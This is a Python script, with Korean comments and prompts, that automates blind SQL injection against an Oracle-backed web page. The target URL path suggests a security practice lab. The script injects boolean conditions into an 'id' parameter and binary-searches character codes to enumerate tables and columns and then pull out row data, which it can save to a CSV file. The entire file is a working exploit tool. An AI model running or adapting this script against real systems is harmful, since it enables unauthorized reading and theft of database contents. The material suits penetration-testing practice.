import requests
import csv

requests.packages.urllib3.disable_warnings()

url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=61 and {} "

# 쿼리에 해당하는 글자 찾는 함수
def binarySearch(query):
    start = 1
    end = 15572643
    while start < end : 
        mid = int((start + end) / 2)
        attackQuery = f"({query}) > {mid}" 
        attackurl = url.format(attackQuery)
        response = requests.get(attackurl)
        if '애플워치' in response.text:
            start = mid + 1
        else: 
            end = mid
    return start

# 테이블 개수
tableCount = binarySearch("select count(table_name) from user_tables")
print(f"\n테이블 개수 : {tableCount}개\n")

# 올바른 테이블 선택을 받을 때까지 반복
while True:
    try:
        table = int(input(f"몇 번째 테이블을 뽑을지 골라주세요 (1 ~ {tableCount}) : "))
        if 1 <= table <= tableCount:
            break
        else:
            print("\n❌ 잘못된 입력입니다. 1 ~", tableCount, "범위 내에서 입력해주세요.\n")
    except ValueError:
        print("\n❌ 숫자로 입력해주세요.\n")

print("\n")
print("=" * 50)
print("\n")

# 각 테이블 글자수 뽑아내기
tableLength = binarySearch(f"select length(table_name) from (select table_name, rownum ln from user_tables) where ln = {table}")
print(f"{table}번째 테이블 글자수 : {tableLength}")    

# 테이블 이름 뽑기
tableName = ""
for substr in range(1, tableLength + 1):
    ascii = binarySearch(f"select ascii(substr(table_name,{substr},1)) from (select table_name, rownum ln from user_tables) where ln = {table}")
    tableName += chr(ascii)
print(f"{table}번째 테이블 이름 : {tableName}")

# 해당 테이블의 컬럼 개수 뽑기
columnCount = binarySearch(f"select count(column_name) from user_tab_columns where table_name = '{tableName}'")
print(f"{tableName} 테이블의 컬럼 개수 : {columnCount} \n\n")

print("=" * 50)

columnNames = []
for count2 in range(1, columnCount + 1):     
    columnLength = binarySearch(f"select length(column_name) from (select column_name, rownum ln from user_tab_columns where table_name = '{tableName}') where ln = {count2}")
    columnName = ""
    for substr2 in range(1, columnLength + 1):
        ascii = binarySearch(f"select ascii(substr(column_name,{substr2},1)) from (select column_name, rownum ln from user_tab_columns where table_name = '{tableName}') where ln = {count2}")
        columnName += chr(ascii)
    columnNames.append(columnName)
    print(f"{count2} : {columnName}")

print("=" * 50)

# 데이터 개수 확인 및 row 입력받기
rowCount = binarySearch(f"select count({columnNames[0]}) from {tableName}")
print(f"\n{tableName} 테이블의 데이터 개수 : {rowCount}개\n")
print("=" * 50)

# 엑셀 저장 여부를 올바르게 입력받을 때까지 반복
while True:
    saveToCsv = input("\n📁 지금부터 뽑는 데이터의 내용을 엑셀파일로 저장하시겠습니까? (y/n) : ").strip().lower()
    if saveToCsv in ["y", "n"]:
        break
    print("\n❌ 잘못된 입력입니다. 'y' 또는 'n'을 입력해주세요.")

csvFile = None
csvWriter = None

if saveToCsv == "y":
    csvFile = open(f"{tableName}.csv", mode="w", newline="", encoding="utf-8")
    csvWriter = csv.writer(csvFile)
    csvWriter.writerow(columnNames)  # 컬럼명 저장
    print(f"\n📁 데이터가 {tableName}.csv 파일에 저장됩니다.\n")

print("=" * 50)

while True:
    while True:
        try:
            selectedRow = int(input(f"\n출력할 행 번호를 입력하세요 (1 ~ {rowCount}) : "))
            if 1 <= selectedRow <= rowCount:
                break
            else:
                print("\n❌ 잘못된 입력입니다. 1 ~", rowCount, "범위 내에서 입력해주세요.")
        except ValueError:
            print("\n❌ 숫자로 입력해주세요.")

    print()
    print("=" * 50)
    print(f"\n[{selectedRow}번째] 데이터\n")

    rowData = []
    for columnName in columnNames:
        # 해당 컬럼의 데이터 길이 확인
        dataLength = binarySearch(f"select length({columnName}) from (select {columnName}, rownum as ln from {tableName}) where ln = {selectedRow}")

        # 데이터 추출 (UTF-8 인코딩 처리)
        dataBytes = []
        for substr3 in range(1, dataLength + 1):
            ascii = binarySearch(f"select ascii(substr({columnName},{substr3},1)) from (select {columnName}, rownum as ln from {tableName}) where ln = {selectedRow}")

            # ASCII 문자 처리
            if 0 <= ascii <= 127:  
                dataBytes.append(ascii.to_bytes(1, 'big'))
            elif 128 <= ascii <= 255:
                dataBytes.append(ascii.to_bytes(1, 'big'))
            elif ascii > 255:
                utf8_bytes = ascii.to_bytes((ascii.bit_length() + 7) // 8, 'big')
                dataBytes.append(utf8_bytes)

        dataValue = b"".join(dataBytes).decode('utf-8', errors='replace')  # UTF-8 변환
        print(f"{columnName} : {dataValue}")
        rowData.append(dataValue)

    # CSV 파일 저장
    if saveToCsv == "y":
        csvWriter.writerow(rowData)

    print("\n")
    print("=" * 50)

    while True:
        continue_choice = input("\n계속하시겠습니까? (y/n) : ").strip().lower()
        if continue_choice in ["y", "n"]:
            break
        print("\n❌ 잘못된 입력입니다. 'y' 또는 'n'을 입력해주세요.")

    print()
    print("=" * 50)

    if continue_choice == "n":
        if saveToCsv == "y":
            csvFile.close()
            print(f"\n📁 {tableName}.csv 파일 저장이 완료되었습니다.")
        print("\n프로그램을 종료합니다.\n")
        exit()
